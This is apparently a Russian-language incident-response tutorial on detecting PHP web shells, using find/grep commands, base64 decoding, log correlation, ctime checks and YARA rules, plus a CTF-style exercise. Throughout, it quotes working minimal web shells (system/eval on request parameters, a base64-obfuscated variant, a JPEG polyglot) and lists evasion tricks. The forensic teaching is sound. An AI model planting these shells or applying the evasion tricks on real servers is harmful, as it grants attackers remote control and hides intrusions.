## Вопрос, с которого всё начинается

На сервере есть веб-шелл — файл, дающий удалённое управление через HTTP. Его нужно
найти, понять и связать с активностью. Разберём.

## Наш пример: PHP-шелл

## Шаг 1: где искать

Шеллы прячут в:

- `uploads/` (загружаемые файлы);
- изменённых темах/плагинах;
- `images/`, `cache/` (маскировка);
- корне каталога с случайным именем.

```
$ find /var/www -type f \( -name '*.php' -o -name '*.jsp' -o -name '*.aspx' \) -newermt '2026-01-14 03:00'
```

## Шаг 2: паттерны

Типичные функции:

```
$ grep -rEn 'eval\(|assert\(|system\(|exec\(|passthru\(|base64_decode\(|preg_replace.*/e' /var/www/
```

`eval` + `base64_decode` — почти наверняка шелл.

## Шаг 3: обфускация

Шеллы обфусцируют:

- base64/gzinflate;
- конкатенация строк;
- динамические имена функций (`$f='sys'.'tem'`).

```
$ grep -rE '\$[a-z]+\(.*\$_(GET|POST|REQUEST)' /var/www/ | head
```

Вызов функции с параметром из запроса — классический шелл.

## Шаг 4: следы активности

Найди, что шелл делал:

```
$ grep -E 'shell\.php|/upload' /var/log/nginx/access.log | tail
```

И сопоставь с созданными файлами, процессами, сетевыми соединениями.

## Шаг 5: что искать

- файлы с eval/base64;
- вызовы системных функций с user-input;
- свежие файлы в webroot;
- POST-запросы к подозрительным путям;
- исходящие соединения от веб-сервера.

## Что мы теперь знаем

- Шеллы прячут в uploads/темах/маскировке.
- Паттерны: eval, base64_decode, system+user-input.
- Обфускация — base64, конкатенация, динамические имена.
- Логи показывают использование шелла.
- Связываем файл с активностью.

## Если не сработало

- Шелл закодирован? Декодируй base64/gzip.
- Нет доступа к файлам? Ищи по логам и процессам.
- Нужен масштаб? Используй YARA-правила для шеллов.

## Разбор инцидента: шелл в теме WordPress

Представим типовой случай. Сайт на WordPress, хостинг shared. Дежурный заметил, что ночью
выросла нагрузка на CPU, а в `wp-content/uploads/` появились файлы с именами вида
`2026-01-14-logo.php`. Начнём с хронологии: сначала определяем **временное окно**
компромисса, потом сужаем поиск.

```
$ find /var/www/html -type f -newermt '2026-01-14 00:00' ! -newermt '2026-01-15 00:00' \
    -printf '%TY-%Tm-%Td %TH:%TM  %s  %p\n' | sort
2026-01-14 03:12  4821  /var/www/html/wp-content/uploads/2026/01/2026-01-14-logo.php
2026-01-14 03:12  2043  /var/www/html/wp-content/plugins/hello-dolly/inc.php
```

Два файла в одно и то же время — почти наверняка одна кампания. Первый лежит среди картинок
(маскировка под медиа), второй — внутри плагина (persistence: плагин грузится всегда).

## Разбор найденного файла

Читаем содержимое подозрительного файла, но **не запускаем** его:

```
$ sed -n '1,40p' /var/www/html/wp-content/uploads/2026/01/2026-01-14-logo.php
<?php
$k = 'c3lzdGVt';                       // base64("system")
$f = base64_decode('c3lzdGVt');
@$f($_POST['cmd']);
?>
```

Расшифровка: `base64_decode('c3lzdGVt')` даёт строку `system`, а `$_POST['cmd']` — команда из
запроса. Это классический **мини-шелл** на одну команду. Имя переменной `$k` и вызов
через переменную — приём обхода наивных сигнатур, ищущих буквально `system(`.

Полезная привычка: декодировать все base64-строки из файла разом.

```
$ grep -oE '[A-Za-z0-9+/]{16,}={0,2}' shell.php | while read b; do
    echo -n "$b -> "; echo "$b" | base64 -d 2>/dev/null; echo; done
c3lzdGVt -> system
```

## Таблица: признаки семейств веб-шеллов

| Семейство | Маркеры в коде | Обфускация | Особенность |
|---|---|---|---|
| China Chopper | `@eval($_POST[...])` | почти нет | крошечный, 1 строка |
| Weevely | длинный набор функций | gzinflate + base64 | полноценный C2-клиент |
| b374k | `@extract`, файловый менеджер | именованные функции | UI-шелл с браузером файлов |
| WSO | `wso_` префиксы | перемешанные переменные | продвинутый, есть хеши |
| p0wny-shell | HTML + `shell_exec` | нет | терминал в браузере |

Знание семейства сразу подсказывает, какой лог-паттерн искать: у Weevely — характерный
`POST` с параметром в теле и HTTP-заголовками C2, у p0wny — запросы к `/shell.php` с
параметром `cmd`.

## Восстановление сессии атакующего из логов

Файл — это инструмент; интереснее, **что им делали**. Соединяем лог веб-сервера с логом
доступа и вытаскиваем запросы к шеллу:

```
$ grep '2026-01-14-logo.php' /var/log/nginx/access.log | awk '{print $1, $4, $6, $7, $9}' | head
198.51.100.23 [14/Jan/2026:03:14:02] POST /wp-content/uploads/2026/01/2026-01-14-logo.php 200
198.51.100.23 [14/Jan/2026:03:14:05] POST /wp-content/uploads/2026/01/2026-01-14-logo.php 200
198.51.100.23 [14/Jan/2026:03:41:19] POST /wp-content/uploads/2026/01/2026-01-14-logo.php 200
```

Три обращения, все `POST`, все `200` — значит команды выполнялись. Дальше коррелируем
время с другими источниками: новые файлы, изменения в базе, исходящие соединения.

```
$ grep -E '198\.51\.100\.23' /var/log/nginx/access.log | grep -vE '\.(png|jpg|css|js)' | wc -l
47
```

47 «нестатических» запросов с одного адреса — картина активной ручной работы.

## Корреляция: что ещё оставил атакующий

Шелл почти никогда не один. Проверяем типовые точки persistence:

```
$ crontab -l 2>/dev/null; ls -la /var/spool/cron/crontabs/ 2>/dev/null
$ grep -rE 'eval|base64_decode|shell_exec' /var/www/html/wp-content/themes/ 2>/dev/null
$ ls -la ~/.ssh/authorized_keys /root/.ssh/authorized_keys 2>/dev/null
```

Каждый найденный артефакт добавляем в таймлайн. Настоящая ценность расследования — не
сам факт шелла, а **полная цепочка**: как попали (уязвимый плагин), что закрепили
(cron/ключи), куда ходили (исходящие IP).

## Ограничения метода

Поиск по паттернам имеет слепые зоны. Во-первых, **легитимный код** тоже использует
`eval` — шаблонизаторы, плагины кэша. Ложные срабатывания неизбежны, поэтому важна
корреляция с временем и местом файла. Во-вторых, шелл может быть **полностью зашифрован**
(AES с ключом в заголовке Cookie) — сигнатурный поиск не увидит `system`. В-третьих,
если атакующий загрузил шелл в память и удалил файл, на диске его не останется — тогда
работают только логи и дампы процессов.

## Если сработало: подтверждаем находку

Если паттерн совпал, не спеши объявлять победу — подтверди тремя независимыми фактами:
файл существует, он новее базовой установки, и его имя встречается в логах. Только
совпадение всех трёх превращает «подозрительный файл» в доказательство.

## Практический разбор: дамп с шеллом

Задача-упражнение. Дан каталог `webroot/` с сотнями файлов; нужно найти шелл и извлечь
метку. Порядок действий:

1. **Быстрый фильтр по расширению и времени.** Шеллы часто маскируются под картинки, но
   остаются `.php`, поэтому смотрим и `file`, и содержимое.

```
$ find webroot -type f -name '*.php' -exec grep -lE 'eval|assert|system|passthru' {} + 
webroot/assets/1x1.php
webroot/index.php
```

2. **Отсеиваем легитимные.** `index.php` — точка входа CMS, а `1x1.php` размером 11 КБ при
   обещанном «1x1» — подозрительно.

```
$ wc -c webroot/assets/1x1.php && file webroot/assets/1x1.php
11482 webroot/assets/1x1.php
webroot/assets/1x1.php: PHP script, ASCII text
```

3. **Смотрим строку с меткой.** Флаг часто лежит прямо в коде или в комментарии.

```
$ grep -oE 'nto\{[^}]*\}' webroot/assets/1x1.php
nto{w3bsh3ll_b4s3_3nc0d3}
```

4. **Проверяем, что это не ложное срабатывание.** Убеждаемся, что рядом есть вызов
   пользовательского ввода.

## Таблица: быстрые команды обнаружения

| Цель | Команда | Что ловит |
|---|---|---|
| Свежие файлы | `find -newermt '<date>'` | недавно созданные шеллы |
| Код исполнения | `grep -rE 'eval|system|shell_exec'` | прямые вызовы |
| Кодирование | `grep -rE 'base64_decode|gzinflate|str_rot13'` | обфускация |
| Ввод из запроса | `grep -rE '\$_(GET\|POST\|REQUEST)'` | канал управления |
| Размер-аномалия | `find -size +5k -name '*.php'` | «толстые» шеллы |

## Анти-форензика: что делает атакующий против нас

Опытный противник старается замести следы. Типовые приёмы:

- **сброс mtime** — `touch -d` или копирование времени соседних файлов, чтобы файл не
  выделялся датой;
- **удаление логов** — `rm access.log` или обрезка до нуля, чтобы не осталось записей;
- **лог-инъекции** — подделка User-Agent со спецсимволами, чтобы сломать парсеры;
- **хранение только в памяти** — шелл как PHP-расширение или через `auto_prepend_file`.

Против сброса mtime работает сравнение **ctime** (время изменения inode) с mtime: если
ctime новее mtime, метаданные трогали.

```
$ stat -c 'mtime=%y ctime=%z' webroot/assets/1x1.php
mtime=2025-11-02 10:00:00 ctime=2026-01-14 03:12:44
```

mtime «старый», а ctime — ночь инцидента. Классический сброс времени раскрыт.

## Работа с YARA для масштаба

Когда файлов тысячи, ручной grep не тянет. Пишем правило:

```
rule MiniShell {
  strings:
    $a = /base64_decode\s*\(\s*['"][A-Za-z0-9+\/=]{8,}/
    $b = /\$_(POST|GET|REQUEST)\s*\[/
    $c = /(eval|assert|system|passthru)\s*\(/
  condition:
    any of them and filesize < 100KB
}
```

```
$ yara -r minishell.yar webroot/ | head
MiniShell webroot/assets/1x1.php
```

YARA даёт воспроизводимость: правило можно сохранить и прогнать по другим образам.

## Разница между «нашли» и «доказали»

Для отчёта важно зафиксировать **атрибуцию по времени**: когда файл появился (ctime),
когда его впервые запросили (лог), и когда произошла первая подозрительная команда.
Три временные метки, сходящиеся в пределах минут, — это уже доказательство, а не догадка.

## Если не сработало: негативный результат тоже результат

Если сигнатуры не нашли ничего, зафиксируй это явно. Возможные причины: шелл удалён,
зашифрован, или работает не через файл. Проверь альтернативные каналы — `auto_prepend_file`
в `php.ini`, подозрительные cron-задачи, изменённые `.htaccess` с `AddType` или `php_value`.

## Связь с другими артефактами веб-форензики

Веб-шелл почти всегда соседствует с другими следами. После его обнаружения проверь:
журнал базы данных (шелл часто читает `wp_users`), очередь почты (шелл рассылает спам),
файлы сессий PHP в `/tmp` или `/var/lib/php/sessions`. Сопоставление даёт полную картину
кампании и помогает понять, был ли доступ только к сайту или ко всему серверу.

## Итоговая проверка

Убедись, что для каждого найденного файла у тебя есть ответ на четыре вопроса: когда он
появился, кто его создал, что через него выполняли и как закрепились. Без этих четырёх
ответов находка остаётся «файлом», а не инцидентом.

## Как выглядят шеллы: три поколения

Шеллы эволюционировали, и понимание поколений помогает быстро оценить находку.

**Первое поколение — однострочник.** Минимальный шелл — одна строка:

```
<?php system($_GET['cmd']); ?>
```

Он занимает десятки байт, но выдаёт себя мгновенно: в файле есть вызов
`system` с параметром из запроса. Такие файлы обычно прячут в `uploads/`
под именем картинки.

**Второе поколение — обфусцированный.** Автор прячет опасные вызовы так,
чтобы `grep system(` их не находил:

```
<?php $k="c3lzdGVt"; $f=base64_decode($k); @$f($_REQUEST['x']); ?>
```

Здесь имя функции `system` записано в base64 (`c3lzdGVt`). Проверить легко:

```
$ echo c3lzdGVt | base64 -d
system
```

При запуске PHP декодирует строку и вызывает функцию уже в рантайме. В
исходнике слова `system` нет — есть `base64_decode`. Именно поэтому в поиске
нужны не только имена функций, но и признаки декодирования.

**Третье поколение — фреймворк-шелл.** Полноценные шеллы (b374k, c99, r57,
WSO, Weevely) весят десятки-сотни килобайт и дают веб-интерфейс: файловый
менеджер, SQL-клиент, запуск команд, брутфорс, загрузку файлов. Их легко
найти по размеру и по строкам вроде `c99shell`, но они же и самые опасные —
в них встроена маскировка (например, требование пароля, чтобы антивирусный
сканер не увидел панель).

## Практика: находим обфусцированный шелл

Вернёмся к нашему серверу. Ищем не по одной сигнатуре, а по семейству
признаков декодирования и динамических вызовов:

```
$ grep -rEl 'base64_decode|gzinflate|str_rot13|create_function|assert\(' /var/www 2>/dev/null | head
/var/www/uploads/2026-01-14_avatar.php
/var/www/wp-content/themes/twentytwenty/functions.php
```

Флаг `-E` включает расширенные регулярные выражения, `-l` печатает только
имена файлов. Так мы не утонули в выводе, а получили короткий список.

Теперь смотрим на подозрительный файл целиком:

```
$ cat /var/www/uploads/2026-01-14_avatar.php
<?php $k="c3lzdGVt"; $f=base64_decode($k); @$f($_REQUEST['x']); ?>
```

Читаем логику: строка `x` приходит из запроса (`$_REQUEST` включает и GET, и
POST), декодируется как имя функции и вызывается. Значит, атакующий может
передать `?x=id` или `?x=wget ...`. Проверяем гипотезу на копии — никогда не
на боевом файле.

## Распаковка многослойной обфускации

Реальные шеллы часто упакованы в несколько слоёв: base64 внутри gzinflate
внутри ещё одного base64. Снимаем слои по одному, каждый раз глядя на
результат. Для PHP удобно использовать сам интерпретатор на изолированной
машине:

```
$ php -r '$s=file_get_contents("stage.txt"); echo gzinflate(base64_decode($s));' | head
```

Важно: **не выполняй** найденный код на боевой машине и не давай ему сетевой
доступ. Декодируй в песочнице, без интернета. Если в распакованном коде видно
второй этап (например, обращение к внешнему домену за «плагином») — это уже
инфраструктура атакующего, отдельная ценная улика.

## Сопоставление с логами: строим мини-таймлайн

Файл найден — теперь докажем, что им пользовались. Берём время изменения
файла:

```
$ stat -c '%y %n' /var/www/uploads/2026-01-14_avatar.php
2026-01-14 03:28:09.000000000 +0000 /var/www/uploads/2026-01-14_avatar.php
```

И ищем обращения в логе доступа рядом с этим временем:

```
$ grep 'avatar.php' /var/log/nginx/access.log | head
203.0.113.5 - - [14/Jan/2026:03:28:11 +0000] "POST /uploads/2026-01-14_avatar.php HTTP/1.1" 200 41 "-" "curl/7.81.0"
```

Совпадение по секундам и один и тот же клиент (`203.0.113.5`, `curl`) —
сильное доказательство. Дальше связываем с процессами и сетевыми
соединениями веб-сервера в тот же интервал, чтобы увидеть, что запускал
шелл.

## YARA: масштабируем поиск

На одном сервере можно смотреть глазами, но на сотнях нужен автомат. YARA
описывает признаки правилом:

```
rule php_webshell_generic {
  meta:
    description = "generic PHP webshell indicators"
  strings:
    $a = "eval(" ascii
    $b = "base64_decode(" ascii
    $c = "$_POST[" ascii
    $d = "system(" ascii
  condition:
    2 of them
}
```

Условие `2 of them` снижает ложные срабатывания: одного `$_POST[` мало, а
вот `base64_decode` вместе с `eval` — почти наверняка шелл. Запуск:

```
$ yara -r webshell.yar /var/www
php_webshell_generic /var/www/uploads/2026-01-14_avatar.php
```

## Где ещё прячут шеллы

Кроме `uploads/` шеллы встречаются в:

- **темах и плагинах CMS** — правка легитимного `functions.php`;
- **му-плагинах WordPress** (`wp-content/mu-plugins/`) — грузятся всегда;
- **`.well-known/`**, `cache/`, `images/` — там не ищут;
- **полиглотах** — файл одновременно валидная картинка и PHP: `file`
  говорит `JPEG image data`, а внутри после `FFD8` лежит `<?php ... ?>`.

```
$ file uploads/logo.jpg
uploads/logo.jpg: JPEG image data, JFIF standard 1.01
$ strings uploads/logo.jpg | grep -i '<?php'
<?php @eval($_POST['p']); ?>
```

Полиглот обходит проверки «это картинка?», поэтому проверять расширение
недостаточно.

## Что делать сразу после обнаружения

1. **Зафиксировать хэш** до любого анализа: `sha256sum webshell.php` —
   иначе доказательство легко оспорить.
2. **Сохранить копию** файла и его метаданные (`stat`, `getfattr`).
3. **Найти точку входа** — как файл оказался в webroot (уязвимость загрузки,
   слабый пароль админки, украденная сессия).
4. **Проверить persistence** — cron, `.bashrc`, `authorized_keys`, второй
   шелл «на всякий случай».
5. **Оценить ущерб** — что читали/писали через шелл, куда ходили.

## Частые ошибки и крайние случаи

- **Двойное кодирование:** payload закодирован дважды (`base64(base64(...))`)
  — снимай слои, пока не увидишь читаемый код.
- **Hex-escape:** `\x65\x76\x61\x6c` — это `eval`; декодируй escape-
  последовательности.
- **Разрыв словами:** `e<комментарий>val` или `e/**/val` ломает простой
  `grep`, но PHP исполнит.
- **NUL-байты:** `file` скажет `data`, а не `PHP script` — смотри `xxd`.
- **`assert` вместо `eval`:** в старых версиях PHP `assert` тоже исполнял код.

## Если сработало / если нет

- **Нашёл и подтвердил активность** — зафиксируй хэш, сохрани логи с
  запросами, опиши цепочку «файл → время → клиент → процесс».
- **Файл есть, а в логах пусто** — возможно, шелл ещё не использовали, либо
  логи ротированы; проверь ротации и `.gz`-архивы.
- **Слишком много совпадений** — уточняй правило (комбинация признаков,
  YARA), не гоняйся за каждым `eval` в легитимном коде фреймворка.
